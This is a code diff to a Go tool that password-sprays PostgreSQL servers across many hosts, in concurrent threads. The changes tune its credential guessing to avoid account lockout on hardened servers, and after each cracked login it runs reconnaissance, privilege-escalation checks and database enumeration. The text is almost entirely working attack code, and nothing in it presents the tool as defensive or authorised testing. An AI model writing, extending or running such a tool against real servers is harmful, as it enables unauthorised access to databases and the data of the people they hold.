@@ -8,10 +8,12 @@ import (
 	"fmt"
 	"net"
 	"os"
+	"os/signal"
 	"sort"
 	"strconv"
 	"strings"
 	"sync"
+	"syscall"
 	"time"
 
 	"github.com/jackc/pgx/v5"
@@ -369,7 +371,7 @@ func isPortOpen(host string, port int, timeout time.Duration) bool {
 	return true
 }
 
-func scanHost(host string, port int, creds []Credential, timeout time.Duration, doEnum bool) HostResult {
+func scanHost(ctx context.Context, host string, port int, creds []Credential, credThreads int, timeout time.Duration, doEnum bool) HostResult {
 	res := HostResult{
 		Host:        host,
 		Port:        port,
@@ -382,25 +384,75 @@ func scanHost(host string, port int, creds []Credential, timeout time.Duration, 
 	}
 	res.Open = true
 
-	tested := make(map[string]bool)
+	// Phase 1: test credentials concurrently, stop probing a user once one password works.
+	// Skipping further attempts on a cracked user avoids redundant work and prevents
+	// account lockout on hardened servers.
+	var foundMu sync.Mutex
+	found := make(map[string]bool)
+
+	validCh := make(chan Credential, credThreads)
+	credSem := make(chan struct{}, credThreads)
+	var credWg sync.WaitGroup
+
 	for _, cred := range creds {
+		if ctx.Err() != nil {
+			break
+		}
+		foundMu.Lock()
+		already := found[cred.User]
+		foundMu.Unlock()
+		if already {
+			continue
+		}
+
+		credWg.Add(1)
+		credSem <- struct{}{}
+		go func(c Credential) {
+			defer credWg.Done()
+			defer func() { <-credSem }()
+
+			foundMu.Lock()
+			already := found[c.User]
+			foundMu.Unlock()
+			if already || ctx.Err() != nil {
+				return
+			}
+
+			conn, err := dbConnect(host, port, c.User, c.Password, "postgres", timeout)
+			if err != nil {
+				return
+			}
+			conn.Close(context.Background())
+
+			foundMu.Lock()
+			if found[c.User] {
+				foundMu.Unlock()
+				return
+			}
+			found[c.User] = true
+			foundMu.Unlock()
+			validCh <- c
+		}(cred)
+	}
+	credWg.Wait()
+	close(validCh)
+
+	// Phase 2: recon + privesc for each cracked user (one cred per user from Phase 1).
+	for cred := range validCh {
+		if ctx.Err() != nil {
+			break
+		}
+		res.Credentials = append(res.Credentials, cred)
 		conn, err := dbConnect(host, port, cred.User, cred.Password, "postgres", timeout)
 		if err != nil {
 			continue
 		}
-		res.Credentials = append(res.Credentials, cred)
-		key := cred.User + "\x00" + cred.Password
-		if !tested[key] {
-			tested[key] = true
-			label := cred.User + "@" + cred.Password
-			res.Recon[label] = collectRecon(conn)
-			res.Findings = append(res.Findings, checkPrivesc(conn)...)
-			closeConn(conn)
-			if doEnum {
-				res.Enumeration[label] = enumerateAccess(host, port, cred.User, cred.Password, timeout)
-			}
-		} else {
-			closeConn(conn)
+		label := cred.User + "@" + cred.Password
+		res.Recon[label] = collectRecon(conn)
+		res.Findings = append(res.Findings, checkPrivesc(conn)...)
+		closeConn(conn)
+		if doEnum {
+			res.Enumeration[label] = enumerateAccess(host, port, cred.User, cred.Password, timeout)
 		}
 	}
 	return res
@@ -707,10 +759,14 @@ func loadWordlist(path string) ([]string, error) {
 	return words, sc.Err()
 }
 
+// buildCredentials produces a password-first ordering: try password #1 against every
+// user, then password #2, etc. This is the standard "password spray" pattern — it
+// finds the most common credentials fastest across the user set and limits the
+// per-user failure rate (lockout-friendly).
 func buildCredentials(users, passwords []string) []Credential {
 	creds := make([]Credential, 0, len(users)*len(passwords))
-	for _, u := range users {
-		for _, p := range passwords {
+	for _, p := range passwords {
+		for _, u := range users {
 			creds = append(creds, Credential{u, p})
 		}
 	}
@@ -720,11 +776,12 @@ func buildCredentials(users, passwords []string) []Credential {
 // ─── Main ─────────────────────────────────────────────────────────────────────
 
 func main() {
-	hostsFile  := flag.String("hosts", "", "File with target hosts (host, host:port, or host:port1,port2)")
-	usersFile  := flag.String("users", "", "File with one username per line")
-	passwdFile := flag.String("passwords", "", "File with one password per line")
-	portsFlag  := flag.String("ports", "5432", "Default port(s) for hosts with no port specified (comma-separated)")
-	threads    := flag.Int("threads", 10, "Concurrent goroutines")
+	hostsFile   := flag.String("hosts", "", "File with target hosts (host, host:port, or host:port1,port2)")
+	usersFile   := flag.String("users", "", "File with one username per line")
+	passwdFile  := flag.String("passwords", "", "File with one password per line")
+	portsFlag   := flag.String("ports", "5432", "Default port(s) for hosts with no port specified (comma-separated)")
+	threads     := flag.Int("threads", 10, "Concurrent goroutines (hosts in parallel)")
+	credThreads := flag.Int("cred-threads", 16, "Concurrent credential attempts per host")
 	timeoutSec := flag.Float64("timeout", 5, "Connection timeout in seconds")
 	outputFile := flag.String("output", "", "Write JSON report to this file")
 	doEnum     := flag.Bool("enumerate", false, "Enumerate accessible databases, schemas, and tables per credential")
@@ -763,7 +820,7 @@ func main() {
 	fmt.Printf("[*] Users     : %d\n", len(users))
 	fmt.Printf("[*] Passwords : %d\n", len(passwords))
 	fmt.Printf("[*] Combos    : %d\n", len(creds))
-	fmt.Printf("[*] Threads   : %d\n", *threads)
+	fmt.Printf("[*] Threads   : %d hosts / %d creds\n", *threads, *credThreads)
 	fmt.Printf("[*] Timeout   : %.1fs\n", *timeoutSec)
 	enumStr := "no"
 	if *doEnum {
@@ -771,18 +828,28 @@ func main() {
 	}
 	fmt.Printf("[*] Enumerate : %s\n\n", enumStr)
 
+	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
+	defer stop()
+	go func() {
+		<-ctx.Done()
+		fmt.Fprintln(os.Stderr, "\n[!] Interrupted — finishing in-flight scans, partial results will be saved.")
+	}()
+
 	results := make([]HostResult, 0, len(targets))
 	var mu sync.Mutex
 	sem := make(chan struct{}, *threads)
 	var wg sync.WaitGroup
 
 	for _, t := range targets {
+		if ctx.Err() != nil {
+			break
+		}
 		wg.Add(1)
 		sem <- struct{}{}
 		go func(t scanTarget) {
 			defer wg.Done()
 			defer func() { <-sem }()
-			result := scanHost(t.host, t.port, creds, timeout, *doEnum)
+			result := scanHost(ctx, t.host, t.port, creds, *credThreads, timeout, *doEnum)
 			mu.Lock()
 			results = append(results, result)
 			printResult(result, *verbose)
